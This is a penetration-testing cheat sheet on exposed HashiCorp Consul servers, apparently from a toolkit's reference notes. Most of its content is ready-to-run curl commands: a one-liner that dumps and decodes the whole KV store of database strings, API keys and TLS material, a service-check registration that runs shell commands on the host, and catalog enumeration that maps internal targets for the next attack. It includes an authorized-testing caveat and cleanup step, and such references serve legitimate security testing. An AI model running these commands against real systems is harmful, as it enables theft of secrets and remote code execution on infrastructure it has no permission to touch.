---
service: consul
title: HashiCorp Consul
ports: 8500, 8501, 8300, 8301, 8600
aliases: consul-http, consul-rpc
---

# Consul — quick wins

**When you see it:** 8500/tcp open and `/v1/agent/self` answers without an ACL token → ACLs
are disabled (the default). That means full KV read, service catalog access, and — if script
checks are enabled — command execution on the agent host.

> Authorized testing only. Triage is read-only. Steps marked ✏️ register services / health
> checks on the target (which can execute commands) — get sign-off and de-register afterwards.

## Triage (read-only)
```sh
curl -s http://H:8500/v1/agent/self | python3 -m json.tool   # version, config, ACL state
curl -s http://H:8500/v1/acl/list                            # "ACL support disabled" = open
curl -s "http://H:8500/v1/kv/?recurse"                       # full KV dump (base64 values)
curl -s http://H:8500/v1/catalog/services                    # registered services
```

## Quick wins

### Dump the KV store
```sh
curl -s "http://H:8500/v1/kv/?recurse" | python3 -c \
 'import sys,json,base64;[print(k["Key"],"=",base64.b64decode(k["Value"]).decode(errors="replace")) for k in json.load(sys.stdin) if k.get("Value")]'
```
*Why:* Consul KV is where apps stash DB strings, API keys, and TLS material; `?recurse`
returns the whole tree in one unauthenticated call.

### Service-check RCE (script checks enabled) ✏️
```sh
curl -s -XPUT http://H:8500/v1/agent/service/register -d '{
 "Name":"pwn","Check":{"Args":["/bin/sh","-c","id > /tmp/consul_poc"],"Interval":"10s"}}'
# cleanup:
curl -s -XPUT http://H:8500/v1/agent/service/deregister/pwn
```
*Why:* if the agent runs with `enable_script_checks`/`enable_local_script_checks true`, a
registered health check executes your command as the Consul user — the classic Consul RCE.
Verify the setting in `/v1/agent/self` (`EnableScriptChecks`) first.

### Enumerate nodes and service topology
```sh
curl -s http://H:8500/v1/catalog/nodes
curl -s http://H:8500/v1/catalog/service/SERVICENAME
```
*Why:* maps the whole datacenter — every node, its address, and the services it runs —
handing you the next set of internal targets.

## aranum helpers
- `aranumtoolkit/network/enum-consul.sh` — dispatcher (`agent/self`, unauth KV dump, service catalog, ACL state).

## Gotchas
- ACLs enabled → calls return 403 `Permission denied`; a leaked `X-Consul-Token` (in KV, env, or Vault) re-opens everything.
- Script checks are disabled by default since Consul 0.9 — the RCE only fires where they were explicitly re-enabled.
- 8501 is the HTTPS variant (`curl -k`); 8300/8301 are Serf/RPC and not directly probeable with curl.
- Consul often fronts Vault/Nomad — KV secrets here frequently unlock those too.

## Sources
- HackTricks `8500-pentesting-consul`; HashiCorp Consul HTTP API docs; Consul script-check RCE writeups.
